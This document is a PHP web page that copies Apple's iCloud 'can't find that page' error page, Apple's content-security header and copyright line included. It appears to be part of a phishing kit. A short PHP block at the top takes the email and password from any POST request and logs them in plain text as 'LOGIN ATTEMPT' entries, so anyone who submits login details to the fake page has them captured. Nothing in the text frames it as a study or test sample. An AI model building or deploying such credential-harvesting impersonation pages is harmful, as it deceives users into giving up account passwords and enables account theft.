<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';

    // Log credentials to the error log
    error_log("LOGIN ATTEMPT: Email: $email | Password: $password");
}
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Security-Policy" content="base-uri 'self' *.icloud.com *.icloud.com.cn; default-src 'none'; script-src 'self' 'sha256-S6pGkJFqWS2b02k9hlGxJpUMddkjZlZXvSulz4HU9G0=' 'sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=' 'sha256-W5N24rT7z5iBRZ4bbIjiywoiqime7VDx1tEP1yeiO+I=' 'sha256-BntKjHrcVBVtPpjTqmF6ncxwFx6jYqpliXQouRhIkTg='; style-src 'self'; img-src 'self'; media-src 'self'; font-src 'self'; connect-src 'self' *.icloud.com *.icloud.com.cn; frame-src 'self'; form-action 'self' *.icloud.com *.icloud.com.cn; child-src blob: 'self'"><meta http-equiv="Content-type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><!--[if IE 7
        ]><script type="text/javascript" charset="utf-8">
            var IEengine = 7;
        </script><!
    [endif]--><!--[if IE 8
        ]><script type="text/javascript" charset="utf-8">
            var IEengine = 8;
        </script><!
    [endif]--><link rel="apple-touch-icon" sizes="152x152" href="https://www.icloud.com/resources/images/touch-icon-pad-retina"><link rel="stylesheet" href="iCloud%20can%E2%80%99t%20find%20that%20page_files/styles.css"><script type="text/javascript">var B,Browser=B=function(){for(var e=navigator.userAgent.toLowerCase(),t=((e.match(/.+(?:rv|it|ra|ie)[\/: ]([\d.]+)/)||[])[1]||"").split("."),i=0;i<t.length;i++)t[i]=parseInt(t[i],10);for(var a=0,i=0;i<t.length;i++)a+=Math.pow(10,3*(0-i))*t[i];t=a,e={mobileSafari:/apple.*mobile.*safari/.test(e)?t:NaN,iPad:!!/ipad/.test(e)&&!!/applewebkit/.test(e)&&parseFloat(e.substring(e.indexOf("os ")+"os ".length,e.indexOf(" like mac os x")).split("_").join(".")),iPhone:!!/iphone/.test(e)&&!!/applewebkit/.test(e)&&parseFloat(e.substring(e.indexOf("os ")+"os ".length,e.indexOf(" like mac os x")).split("_").join(".")),android:!!/android/.test(e)};return e.iPhone=e.iPhone||e.android,e}();BUILD_INFO={buildNumber:"2512Project30",buildLocale:"en-us"}</script><title>iCloud can’t find that page</title><script type="text/javascript"></script></head><body><div class="wrapper"><div unselectable="on" class="main error"><span class="cloudy"></span><div unselectable="on" class="heading">iCloud can’t find that page.<div unselectable="on" class="textBody"><a href="https://www.apple.com/icloud/">Go to iCloud.com</a></div></div><script type="text/javascript">var url,links,i,len,link,href,reportStats,urlToReplace="https://www.icloud.com",referrer=document.referrer;if(referrer&&(-1!==referrer.indexOf("beta.icloud.com")?url="beta":-1!==referrer.indexOf("developer.icloud.com")&&(url="developer"),url&&(url="https://"+url+".icloud.com",links=document.getElementsByTagName("a"))))for(i=0,len=links.length;i<len;++i)(href=(link=links[i]).href)&&0===href.indexOf(urlToReplace)&&(link.href=url+href.substring(urlToReplace.length))</script><div unselectable="on" class="copyright">Copyright © 2025 Apple Inc. All rights reserved.</div><script type="text/javascript">var date,year,copyright,copyrights=document.getElementsByClassName("copyright");copyrights.length&&(year=(date=new Date).getFullYear(),(copyright=copyrights[0]).innerText=copyright.innerText.replace(/%\{year\}/g,year))</script></div></div></body></html>